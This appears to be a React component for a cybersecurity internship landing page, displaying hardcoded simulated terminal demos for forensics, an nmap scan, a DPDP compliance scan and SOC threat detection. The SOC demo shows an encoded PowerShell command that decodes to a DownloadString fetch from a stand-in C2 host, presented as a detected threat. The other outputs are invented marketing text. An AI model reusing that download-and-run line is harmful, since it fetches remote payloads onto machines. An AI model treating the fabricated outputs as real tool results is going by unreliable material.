import React, { useState } from 'react';
import { Terminal, Shield, Play, RotateCcw, Check, Copy, Flame, Lock } from 'lucide-react';

export default function CyberLabTerminal() {
  const [activeTab, setActiveTab] = useState('forensics');
  const [copied, setCopied] = useState(false);

  const labDemos = {
    forensics: {
      title: "Digital Forensics & Chain of Custody",
      command: "autopsy_cli --target evidence_drive.dd --hash-verify sha256 --extract-registry",
      output: [
        "[+] Initializing Digital Evidence Acquisition Engine v4.19...",
        "[+] Target Image: evidence_drive.dd (Size: 256.0 GB)",
        "[+] Calculating Cryptographic Hash (MD5 / SHA256)...",
        "    SHA256: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
        "    [STATUS] Hash matched with initial seizure acquisition. Integrity VERIFIED.",
        "[+] Scanning Master File Table (MFT) & Volume Shadow Copies...",
        "    [FOUND] 3 Deleted suspicious executable artifacts in AppData\\Local\\Temp\\",
        "    [CARVED] payload_stager.dll (Restored offset: 0x004F2A10)",
        "[+] Generating Section 65B Admissible Evidence Hash Certificate...",
        "[SUCCESS] Evidence packaged ready for Court & Police FIR submission."
      ]
    },
    hacking: {
      title: "Penetration Testing & Vulnerability Assessment",
      command: "nmap -sV -sC -T4 -p 21,22,80,443,8080 target-corp.internal",
      output: [
        "Starting Nmap 7.94 ( https://nmap.org ) at 2026-11-08 14:00 IST",
        "Nmap scan report for target-corp.internal (192.168.10.45)",
        "Host is up (0.0012s latency).",
        "",
        "PORT     STATE SERVICE       VERSION",
        "22/tcp   open  ssh           OpenSSH 8.9p1 Ubuntu",
        "80/tcp   open  http          Apache httpd 2.4.52",
        "443/tcp  open  ssl/http      Apache httpd 2.4.52",
        "8080/tcp open  http-proxy    Tomcat 9.0.58 [VULNERABLE: CVE-2024-XXXX]",
        "|_http-title: Internal Employee Portal & Authentication API",
        "| http-vuln-cve: Critical Auth Bypass identified on /api/v1/auth/token",
        "",
        "[ALERT] Red Team POC: Exploitation demonstrated within safe lab bounds.",
        "[REMEDY] Remediation advisory drafted for engineering team."
      ]
    },
    dpdp: {
      title: "DPDP Act 2023 & Compliance Audit [NEW]",
      command: "dpdp_compliance_scanner --fiduciary OrgID_4091 --ruleset INDIA_DPDP_2023",
      output: [
        "[AUDIT] Scanning Indian Digital Personal Data Protection Act (DPDP 2023) conformance...",
        "[*] Evaluating Data Principal Notice & Multilingual Consent Architecture...",
        "    - Section 6(1): Clear, transparent notice provided in English + 22 Scheduled languages: [PASS]",
        "    - Section 6(3): Unbundled explicit consent mechanism validated: [PASS]",
        "[*] Verifying Children Data Safeguards (Section 9)...",
        "    - Verifiable parental consent mechanism: [CHECK ACTIVE]",
        "[*] Data Breach Notification SLA Check (Section 8(6))...",
        "    - Automated incident dispatch to Data Protection Board of India (DPBI): [CONFIGURED]",
        "[*] Data Fiduciary Penalty Risk Assessment...",
        "    - Potential non-compliance fine mitigation: Up to ₹250 Crores avoided.",
        "[STATUS] Legal compliance posture: 98.4% CERTIFIED."
      ]
    },
    soc: {
      title: "SOC Monitoring & Threat Detection",
      command: "suricata_siem_correlate --alert-level critical --stream live_traffic.pcap",
      output: [
        "[SOC L1/L2] Connecting to Elastic / Wazuh SIEM Cluster...",
        "[EVENT] Ingesting 14,200 events/sec from Perimeter Firewall & EDR agents.",
        "[DETECTION RULE TRIGGERED] Rule ID: WIN-MITRE-T1059.001 (PowerShell Encoded Exec)",
        "    Source Host: DESKTOP-FINANCE-09 (10.0.4.12)",
        "    Process: powershell.exe -enc JABzACAAPQAgAE4AZQB3AC0ATwBiAGo...",
        "    Decoded Payload: DownloadString('https://malicious-c2.net/stage2.bin')",
        "[AUTOMATED RESPONSE PLAYBOOK #42 ACTIVATED]:",
        "    1. Host DESKTOP-FINANCE-09 network isolated in EDR: [COMPLETED]",
        "    2. Malicious IP blocked on Edge Palo Alto Firewall: [APPLIED]",
        "    3. Ticket assigned to Incident Response On-Call Engineer: [P1 DISPATCHED]"
      ]
    }
  };

  const handleCopy = () => {
    navigator.clipboard.writeText(labDemos[activeTab].command);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  return (
    <section id="labs" className="py-20 bg-[#040711] relative overflow-hidden">
      <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 relative z-10">
        
        {/* Section Title */}
        <div className="text-center max-w-3xl mx-auto mb-12">
          <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-cyan-500/10 border border-cyan-500/30 text-cyan-400 text-xs font-mono uppercase tracking-wider mb-4">
            <Terminal className="w-3.5 h-3.5" />
            Interactive Cyber Sandbox Preview
          </div>
          <h2 className="text-3xl sm:text-4xl font-extrabold text-white tracking-tight mb-4">
            Experience <span className="bg-gradient-to-r from-cyan-400 to-indigo-400 bg-clip-text text-transparent">Live Cyber Labs</span>
          </h2>
          <p className="text-slate-400 text-sm sm:text-base">
            During the 28-day internship, you won't just study theory. You will operate actual forensic workstations, ethical hacking suites, SOC telemetry, and legal compliance scanners.
          </p>
        </div>

        {/* Terminal Window Container */}
        <div className="max-w-4xl mx-auto rounded-2xl bg-[#090d16] border border-cyan-500/30 shadow-[0_0_50px_rgba(6,182,212,0.15)] overflow-hidden">
          
          {/* Terminal Title Bar */}
          <div className="bg-[#0f172a] px-3.5 py-2.5 sm:px-4 sm:py-3 border-b border-slate-800 flex items-center justify-between gap-2 overflow-hidden">
            <div className="flex items-center gap-2 min-w-0">
              <span className="w-2.5 h-2.5 sm:w-3 sm:h-3 rounded-full bg-rose-500 shrink-0 inline-block"></span>
              <span className="w-2.5 h-2.5 sm:w-3 sm:h-3 rounded-full bg-amber-500 shrink-0 inline-block"></span>
              <span className="w-2.5 h-2.5 sm:w-3 sm:h-3 rounded-full bg-emerald-500 shrink-0 inline-block"></span>
              <span className="text-[11px] sm:text-xs font-mono text-slate-400 ml-1 sm:ml-2 truncate max-w-[160px] sm:max-w-none">
                cyber-shakti-internship-lab:~# (root@lab-node-01)
              </span>
            </div>

            <div className="flex items-center gap-2 shrink-0">
              <span className="text-[10px] sm:text-[11px] font-mono px-2 py-0.5 rounded bg-emerald-500/10 text-emerald-400 border border-emerald-500/20">
                LIVE SHELL
              </span>
            </div>
          </div>

          {/* Interactive Lab Tabs */}
          <div className="bg-[#0b111e] px-2.5 sm:px-4 pt-2 sm:pt-3 flex flex-wrap gap-1.5 sm:gap-2 border-b border-slate-800">
            <button
              onClick={() => setActiveTab('forensics')}
              className={`px-2.5 sm:px-3 py-1.5 rounded-t-lg text-[11px] sm:text-xs font-mono font-semibold transition-colors flex items-center gap-1.5 ${
                activeTab === 'forensics'
                  ? 'bg-[#090d16] text-cyan-400 border-t-2 border-cyan-400 border-x border-slate-800'
                  : 'text-slate-400 hover:text-white'
              }`}
            >
              <span>1. Forensics</span>
            </button>

            <button
              onClick={() => setActiveTab('hacking')}
              className={`px-2.5 sm:px-3 py-1.5 rounded-t-lg text-[11px] sm:text-xs font-mono font-semibold transition-colors flex items-center gap-1.5 ${
                activeTab === 'hacking'
                  ? 'bg-[#090d16] text-cyan-400 border-t-2 border-cyan-400 border-x border-slate-800'
                  : 'text-slate-400 hover:text-white'
              }`}
            >
              <span>2. Ethical Hacking</span>
            </button>

            <button
              onClick={() => setActiveTab('soc')}
              className={`px-2.5 sm:px-3 py-1.5 rounded-t-lg text-[11px] sm:text-xs font-mono font-semibold transition-colors flex items-center gap-1.5 ${
                activeTab === 'soc'
                  ? 'bg-[#090d16] text-cyan-400 border-t-2 border-cyan-400 border-x border-slate-800'
                  : 'text-slate-400 hover:text-white'
              }`}
            >
              <span>3. SOC Monitoring</span>
            </button>

            <button
              onClick={() => setActiveTab('dpdp')}
              className={`px-2.5 sm:px-3 py-1.5 rounded-t-lg text-[11px] sm:text-xs font-mono font-semibold transition-colors flex items-center gap-1.5 ${
                activeTab === 'dpdp'
                  ? 'bg-[#090d16] text-amber-400 border-t-2 border-amber-400 border-x border-slate-800'
                  : 'text-amber-300/80 hover:text-amber-300'
              }`}
            >
              <span className="w-1.5 h-1.5 rounded-full bg-amber-400"></span>
              <span>4. DPDP Scanner</span>
            </button>
          </div>

          {/* Active Command Prompt */}
          <div className="p-4 sm:p-6 font-mono text-xs sm:text-sm bg-[#090d16]">
            
            <div className="flex items-center justify-between mb-4 pb-3 border-b border-slate-800/80">
              <div className="text-xs text-slate-400">
                Simulation: <strong className="text-white">{labDemos[activeTab].title}</strong>
              </div>
              <button
                onClick={handleCopy}
                className="flex items-center gap-1.5 px-2.5 py-1 rounded bg-slate-800 hover:bg-slate-700 text-slate-300 text-xs transition-colors"
                title="Copy Command"
              >
                {copied ? <Check className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5" />}
                <span>{copied ? 'Copied!' : 'Copy'}</span>
              </button>
            </div>

            {/* Simulated Command Run */}
            <div className="mb-4 text-slate-300 flex items-start gap-2">
              <span className="text-cyan-400 font-bold select-none">$</span>
              <span className="text-emerald-300 font-bold break-all">
                {labDemos[activeTab].command}
              </span>
            </div>

            {/* Output Stream */}
            <div className="space-y-1.5 text-slate-300 leading-relaxed">
              {labDemos[activeTab].output.map((line, idx) => {
                let colorClass = "text-slate-300";
                if (line.includes("[+]") || line.includes("[PASS]") || line.includes("VERIFIED")) colorClass = "text-emerald-400";
                if (line.includes("[ALERT]") || line.includes("VULNERABLE") || line.includes("TRIGGERED")) colorClass = "text-rose-400 font-bold";
                if (line.includes("[*]") || line.includes("SHA256")) colorClass = "text-cyan-300";
                if (line.includes("[SUCCESS]") || line.includes("CERTIFIED")) colorClass = "text-emerald-300 font-bold";

                return (
                  <div key={idx} className={`${colorClass} font-mono text-xs sm:text-[13px]`}>
                    {line}
                  </div>
                );
              })}
            </div>

            <div className="mt-4 pt-3 border-t border-slate-800/60 flex items-center justify-between text-[11px] text-slate-500">
              <span>Status: Execution completed (Return code: 0)</span>
              <span className="text-cyan-400">Cloud Cyber Lab Available 24/7</span>
            </div>

          </div>

        </div>

      </div>
    </section>
  );
}
